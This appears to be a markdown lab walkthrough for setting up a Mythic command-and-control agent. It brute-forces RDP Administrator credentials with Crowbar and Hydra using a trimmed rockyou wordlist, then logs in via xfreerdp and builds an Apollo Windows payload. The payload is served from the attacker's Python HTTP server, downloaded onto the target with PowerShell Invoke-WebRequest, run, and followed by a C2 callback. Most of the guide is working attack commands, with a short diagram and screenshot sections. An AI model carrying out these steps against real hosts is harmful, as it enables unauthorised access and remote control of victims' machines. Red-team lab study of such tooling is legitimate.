# Mythic Agent Setup Guide

## Objective
Guide to set up a Mythic agent, create a payload, deliver it to a target, and establish a command-and-control (C2) session.

## Attack Diagram
![image](https://github.com/user-attachments/assets/c83cac7d-3d81-415e-bd42-5df438ba7d5e)
![image](https://github.com/user-attachments/assets/1b106895-0bc4-47cf-b59a-1a278fcada15)
![image](https://github.com/user-attachments/assets/7e022556-17b0-4085-8c53-f249e174c598)

---

## Steps

### 1. Prepare the Password Wordlist on Kali Linux
```bash
cd /usr/share/wordlists
ls
sudo gunzip rockyou.txt.gz
ls
```
- Verify `rockyou.txt` is available.

Take the first 50 passwords and create a smaller wordlist:
```bash
sudo head -50 rockyou.txt > /home/kali/belayserver-wordlist.txt
```

Edit the new wordlist to add your server password:
```bash
nano /home/kali/belayserver-wordlist.txt
```

### 2. Install Crowbar for Brute Force Attack
```bash
sudo apt-get install crowbar
```

Create a target file:
```bash
nano target.txt
```
- Add your target IP addresses.

Run Crowbar against RDP:
```bash
crowbar -b rdp -u Administrator -C /home/kali/belayserver-wordlist.txt -s <target-ip>
```

Alternatively, use Hydra:
```bash
hydra -t 1 -V -f -l Administrator -P /home/kali/belayserver-wordlist.txt rdp://<target-ip>
```
![image](https://github.com/user-attachments/assets/774d4aee-c0ad-4e56-af14-099eae67f657)

### 3. RDP into Target
Use `xfreerdp`:
```bash
xfreerdp /u:Administrator /p:<Password> /v:<target-ip>:3389
```

![image](https://github.com/user-attachments/assets/bb1f82ae-165f-49a5-bf8a-9a20e9046ee8)
![image](https://github.com/user-attachments/assets/a7edcd6f-af84-411c-b4ec-ad9dff90b0eb)

---

## Setup the Mythic Agent

### 4. SSH into Mythic Server

Browse Mythic Agents Matrix:
- [Mythic Agents Matrix](https://mythicmeta.github.io/overview/agent_matrix.html)

![image](https://github.com/user-attachments/assets/e3b060e9-42c9-4142-9582-bd2ac6ed8609)

Select Apollo agent (uses HTTP and TCP).

Install Apollo agent:
```bash
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

![image](https://github.com/user-attachments/assets/71f23456-e216-4340-89ec-1b3ce2539492)

Install HTTP C2 Profile:
```bash
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

![image](https://github.com/user-attachments/assets/358b83f1-cd70-4f95-92e9-b29aae1fc193)
![image](https://github.com/user-attachments/assets/1c603646-dfd0-43e6-a089-0b27ee13e30a)

### 5. Create a Payload
- Go to: `https://<mythic-server-ip>:7443/new/payloads`
- Click **Actions** ➔ **Generate New Payload**.
- Select **Windows** ➔ **Next**.
- Choose delivery method: **exe file**.
- Select all available commands.
- For callback host, use Mythic server IP (HTTP protocol).
- Name and optionally describe the payload.
- Click **Create Payload**.

![image](https://github.com/user-attachments/assets/d707a207-52d2-46f6-a7c8-f2cc96bb36c8)
![image](https://github.com/user-attachments/assets/f6c18dc8-9c44-408c-8621-7e362fd38c27)
![image](https://github.com/user-attachments/assets/46d7e52c-2b31-4905-aa4c-c33edb6b4ec0)
![image](https://github.com/user-attachments/assets/d2f00e1f-d933-4a25-8924-0d581fda1780)
![image](https://github.com/user-attachments/assets/6845ffb9-6137-46cf-9d36-005406826809)
![image](https://github.com/user-attachments/assets/1ea55c45-6414-4bdc-9602-048e70253518)

### 6. Download the Payload
Copy the download link (example):
```
https://144.202.70.131:7443/direct/download/<payload-id>
```
Use `wget` to download:
```bash
wget <copied-link> --no-check-certificate
```

![image](https://github.com/user-attachments/assets/a0a288e5-638e-41dc-9421-877db81bf967)

### 7. Serve the Payload Using Python HTTP Server
```bash
python3 -m http.server 9999
```

Allow port 9999 through firewall:
```bash
ufw allow 9999
```

![image](https://github.com/user-attachments/assets/e09722f8-daec-4ebc-9871-15655c3f6bd2)

### 8. Deliver the Payload to Target
On the RDP session (PowerShell):
```powershell
Invoke-WebRequest -Uri http://<mythic-server-ip>:9999/<payload-filename> -OutFile "C:\Users\Public\Downloads\<payload-filename>"
```

Run the executable on the target system.

![image](https://github.com/user-attachments/assets/80173790-f4ff-4b8f-9a46-625cc8509d53)

### 9. Verify Callback
- In the Mythic portal, go to **Callbacks**.
- You should see a new connection established.
- Click the red keyboard icon to interact and send commands.

![image](https://github.com/user-attachments/assets/f07a70ba-e1cf-4acd-aedc-963dbe33772f)
![image](https://github.com/user-attachments/assets/7b77f303-caef-420a-93bd-52aef00baf6e)
